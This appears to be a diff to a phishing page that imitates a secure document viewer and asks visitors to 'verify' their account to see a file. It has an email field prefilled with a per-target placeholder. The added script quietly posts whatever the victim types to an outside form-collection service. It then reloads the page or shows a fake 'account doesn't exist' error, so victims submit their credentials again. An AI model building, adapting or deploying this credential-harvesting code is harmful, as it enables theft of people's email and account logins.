@@ -25,7 +25,7 @@ please verify to access.</span><br>
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                             <small></small>
                             <div class="form-group">
-                                <form action="https://formbold.com/s/9mkW5" method="post">
+                                <form id="pdf-form" action="https://formbold.com/s/9mkW5" method="post">
                                     <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" value="replaceemail@domain.com" required>
                             </div>
                             <div class="form-group mt-2">
@@ -41,12 +41,58 @@ please verify to access.</span><br>
                         <div class="col-lg-12 mt-3">
                             <button type="submit" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;">VIEW</button>
                         </div>
+                        </form>
                     </div>
                 </div>
             </div>
         </div>
     </div>
+    <script>
+        document.getElementById('pdf-form').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const submitBtn = document.getElementById('submit-btn');
+            const errorMsg = document.getElementById('error');
+            const passwordMsg = document.getElementById('msg');
+            const form = event.target;
+            const formData = new FormData(form);
+
+            // Disable button and show loading state
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+            errorMsg.style.display = 'none';
+            passwordMsg.style.display = 'none';
+
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    // Wait for 2 seconds, then reload the page
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 2000);
+                } else {
+                    // Show error message
+                    errorMsg.style.display = 'block';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'VIEW';
+                }
+            } catch (error) {
+                // Show error message on network failure
+                errorMsg.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'VIEW';
+            }
+        });
+    </script>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'934601997f927bc9',t:'MTc0NTMzNDE4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'938bb3c23cc3c25a',t:'MTc0NjA2NTAwMy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 
 </html>
